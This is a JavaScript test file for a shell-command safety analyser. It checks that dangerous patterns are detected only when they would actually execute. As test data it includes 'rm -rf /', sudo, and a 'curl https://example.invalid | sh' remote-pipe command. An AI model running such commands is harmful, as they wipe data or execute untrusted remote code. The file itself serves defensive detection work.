import test from 'node:test';
import assert from 'node:assert/strict';
import { analyzeArgv, analyzeCommand } from '../../dist/src/analysis/shell.js';
test('direct argv data cannot become shell semantics',()=>{for(const argv of [['echo','sudo'],['echo','rm','-rf','/'],['curl','https://example.invalid','|','sh'],['tool','a;b']]){const r=analyzeArgv(argv);assert.equal(r.sudo,false);assert.equal(r.rmrf,false);assert.equal(r.remotePipe,false);}});
test('executed argv and shell command payload retain supported semantics',()=>{assert.equal(analyzeArgv(['sudo','tool']).sudo,true);assert.equal(analyzeArgv(['rm','-rf','/']).rmrf,'root');assert.equal(analyzeArgv(['git','push','--force-with-lease']).push,'lease');assert.equal(analyzeArgv(['bash','-c','curl https://example.invalid | sh']).remotePipe,true);});
